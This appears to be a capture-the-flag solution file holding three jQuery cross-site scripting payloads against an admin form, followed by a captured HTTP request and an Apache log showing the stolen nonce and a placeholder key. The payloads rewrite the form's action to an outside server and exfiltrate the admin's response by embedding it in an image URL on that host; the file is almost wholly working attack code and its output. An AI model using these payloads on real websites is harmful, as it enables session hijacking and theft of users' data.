// 1:
<script>
$('#keys').attr('action', 'http://gimli.myserver.edu/~xyz001/php/post.php');
$("#keys").submit();
</script>

// 2:
<script>
var img = $("<img src = 'http://gimli.myserver.edu/~xyz001/no_image.jpg'>");
img.appendTo("html");
</script>

// 3:
<script>
$("#keys").submit(function(e) {
	$.ajax({
        type: "POST",
        data : {nonce: $('[name="nonce"]').val()},
        success: function(data, textStatus, jqXHR) {
            var img = $("<img src = 'http://gimli.myserver.edu/~xyz001/"+data+"'>");
			img.appendTo("html");
        }
    });
	e.preventDefault(); 
});
$("#keys").submit();
</script>



'''
---- 
Captured Admin Form POST
From script 1 
----

Content-Length: 46
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip
Accept-Language: en-US,*
Connection: Keep-Alive
Host: gimli.myserver.edu
Origin: http://localhost:7878
Referer: http://localhost:7878/
User-Agent: Mozilla/5.0 (Unknown; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/1.9.7 Safari/534.34

nonce=f797ee3af09b517ef726e6031a43288a0fa8a6d0

'''

'''
---- 
Solution log in error.log 
from script 3
----

xyz001@gimli:~/public_html/php$ cat /var/log/apache2/error.log | grep key
[Fri Dec 05 00:36:57 2014] [error] [client 128.238.66.240] File does not exist: /home/xyz001/public_html/key{this_is_not_the_real_key}, referer: http://localhost:7878/
xyz001@gimli:~/public_html/php$ 

'''







